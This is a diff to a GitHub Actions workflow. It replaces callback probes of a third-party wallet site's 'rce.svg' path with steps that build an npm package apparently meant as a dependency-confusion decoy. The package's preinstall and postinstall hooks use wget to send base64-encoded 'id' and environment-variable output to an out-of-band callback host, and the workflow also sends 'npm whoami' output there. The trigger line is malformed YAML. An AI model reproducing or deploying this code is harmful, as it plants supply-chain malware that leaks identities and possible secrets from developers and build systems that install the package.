@@ -1,11 +1,24 @@
-name: now2
-on: push
+name: npm
+on: workflow_dispatch:
+  push:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - run: |
-          C=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" "https://wallet.ring.exchange/_next/image?url=%2Frce.svg&w=64&q=75")
-          D=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" "https://wallet.ring.exchange/rce.svg")
-          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/n2-$C$D"
+          mkdir -p /tmp/pkg && cd /tmp/pkg
+          cat > package.json << 'EOF'
+{
+  "name": "blast-mainnet-smart-order-router-28",
+  "version": "0.0.1",
+  "description": "router",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/npmhit-$(id|base64|tr -d \\n|cut -c1-20)",
+    "postinstall": "wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/npmhit2-$(env|base64|tr -d \\n|cut -c1-20)"
+  }
+}
+EOF
+          echo "module.exports={}" > index.js
+          npm whoami 2>&1 | head -2 | base64 | tr -d '\n' | sed 's/^/w-/' | xargs -I{} wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/{}" || true
